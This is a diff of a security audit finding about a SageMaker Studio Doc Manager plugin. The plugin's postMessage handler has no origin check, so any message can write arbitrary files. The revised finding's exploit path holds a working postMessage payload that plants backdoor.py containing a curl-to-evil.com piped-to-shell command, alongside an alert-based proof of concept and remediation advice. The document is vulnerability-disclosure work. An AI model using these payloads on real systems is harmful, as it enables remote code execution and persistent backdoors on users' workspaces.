@@ -62,23 +62,24 @@
 
 ---
 
-### Finding 4: Stored XSS via postMessage Without Origin Validation in Doc Manager Plugin — Arbitrary File Write
+### Finding 4: Stored XSS via postMessage Without Origin Validation in Doc Manager Plugin — Arbitrary File Write (Chain/Escalation)
 
 | Field | Detail |
 |---|---|
 | **Title** | Doc Manager plugin accepts postMessages from any origin for file creation and write operations |
 | **XSS Type** | DOM XSS (leads to stored XSS via file creation) |
-| **Severity** | HIGH |
+| **Severity** | MEDIUM-HIGH (requires chaining with another iframe-context XSS for practical exploitation) |
 | **File(s)** | `opt/conda/share/jupyter/labextensions/@amzn/sagemaker-ui-doc-manager-jl-plugin/static/38.b39da7dcfc05a04a8092.js` (line 1) |
-| **Source** | Cross-origin `postMessage` from any window/iframe |
-| **Sink** | JupyterLab file system operations (create file, write content) |
-| **Sanitization** | No origin check on the `message` event handler |
-| **Why defense fails** | The handler directly processes file operation commands from any message sender without validating the origin. An attacker can create arbitrary files (including `.html` files with XSS payloads or `.py` files with malicious code) in the user's workspace. |
-| **Exploit path** | 1. Attacker page sends `postMessage` to the SageMaker Studio window. 2. The doc-manager handler creates a file with attacker-controlled content. 3. Created `.html` file served via Jupyter's file serving achieves stored XSS. |
-| **PoC** | Attacker page: `target.postMessage({type:'createFile', path:'malicious.html', content:'<script>alert(document.cookie)</script>'}, '*')` |
+| **Source** | `postMessage` from any iframe or window — no `event.origin` check |
+| **Sink** | `e.serviceManager.contents.save(path, {type, content, format})` — writes arbitrary files to JupyterLab filesystem, then auto-opens via `docmanager:open` |
+| **Sanitization** | None. No `event.origin` check. No path validation. No content sanitization. |
+| **Why defense fails** | The `window.addEventListener("message", ...)` handler processes three command types (`sagemaker:nbevent:OpenFile`, `sagemaker:nbevent:OpenUntitledFile`, `sagemaker:nbevent:OpenOrCreateFile`) without checking `event.origin`. Any iframe running within the JupyterLab window hierarchy can use `window.parent.postMessage()` to create files with arbitrary content at arbitrary paths. |
+| **Exploit path** | **Primary (chain with Finding 1):** 1. Malicious notebook cell output contains `<script>` that executes in the notebook renderer iframe (Finding 1). 2. The script calls `window.parent.postMessage({type:"sagemaker:nbevent:OpenOrCreateFile", payload:{type:"file", path:"backdoor.py", content:"import os; os.system('curl evil.com/shell\|sh')", format:"text"}}, "*")`. 3. The Doc Manager handler (no origin check) writes the file to disk and auto-opens it. 4. Result: persistent backdoor file on user's filesystem. **Secondary (standalone):** Requires attacker to obtain a window reference to JupyterLab (via `window.open()` with user gesture, which is subject to popup blockers and requires knowing the SageMaker Studio URL). |
+| **PoC** | From any iframe within JupyterLab: `window.parent.postMessage({type:"sagemaker:nbevent:OpenOrCreateFile", payload:{type:"file", path:"xss_test.html", content:"<script>alert(document.domain)</script>", format:"text"}}, "*")` |
 | **Browser viability** | All modern browsers |
-| **Preconditions** | Victim must have SageMaker Studio open in a browser tab accessible to the attacker. |
-| **Remediation** | Add strict `e.origin` validation. Restrict allowed file operations. Validate file paths and content. |
+| **Preconditions** | **Chain vector:** Requires another XSS in an iframe context within JupyterLab (e.g., Finding 1 notebook renderer, Finding 2 simple browser). **Standalone vector:** Requires window reference via popup (needs user gesture + known Studio URL). |
+| **Honest assessment** | This is a real security flaw — missing origin validation on a handler that writes files to the filesystem. It is NOT independently exploitable from an external website (postMessage requires a window reference). However, it is highly valuable as an escalation primitive: any XSS in a sandboxed iframe (notebook renderer, simple browser, Q Chat) can escalate to persistent file writes, bypassing iframe sandboxing entirely. The handler should validate `event.origin` to prevent cross-context abuse. |
+| **Remediation** | Add strict `event.origin` validation against the expected SageMaker Studio parent origin. Validate file paths (prevent path traversal, restrict to user workspace). Consider a restrictive allowlist of file types that can be created via postMessage. |
 
 ---
 
